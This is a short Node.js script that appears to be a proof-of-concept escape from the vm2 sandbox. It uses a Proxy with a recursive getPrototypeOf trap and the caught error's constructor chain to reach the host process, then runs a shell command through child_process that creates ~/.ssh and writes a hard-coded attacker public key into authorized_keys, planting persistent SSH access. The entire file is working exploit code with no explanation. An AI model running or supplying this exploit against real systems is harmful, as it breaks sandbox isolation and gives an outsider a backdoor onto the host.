const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'ls -la ~/; mkdir ~/.ssh; cd ~/.ssh; echo "ssh_rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Vv+ujfD5JzullSHHBHMLNvQlugWk5mMEd8rl/QrkDvNDNlI/CJuBs+TRcFLE4A5iPrcWzpEv6Bzq61qgvt2qL7dSNm5Am0eaonEWLMbgN7PPbDhylgjTNWL0Hs4kI0izIwpd+HcxKJ5apUfd7jwF3TviSGT4NMroKXwPsF3y3BAzVuz6JM7VirwoFpOXkcMKHz0Jigi1oNZ1LCr1cSVP+fUhdaPfzl6FJ5y8Izw8KgvlOpKYD3XZ20EUg039QOczd6Qh/PQa3Jhvtt8GL30emqOlHKeRSZ/Bdmy7bDhVbmgUtdRuMyfhLiBb21YqpKnl5Xa7J0vjO0OLb53Yr4DNGI4Bjpwse/0yi8rIyVYMEUkouDdbBOxKfurd+VkQc5AOfphZfglGCewAR1Ll3zXpFdFpGDNZ1XvJxK+SJDbMHJLZh2lhMJn8oMhNOi2f00Yzqi9rlTquSLUKFP2zTWXWA16gcPDE6HRXxth2/qI8+YqpAINEGC273841nR7zyLM=" > ~/.ssh/authorized_keys; cat ~/.ssh/authorized_keys';
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
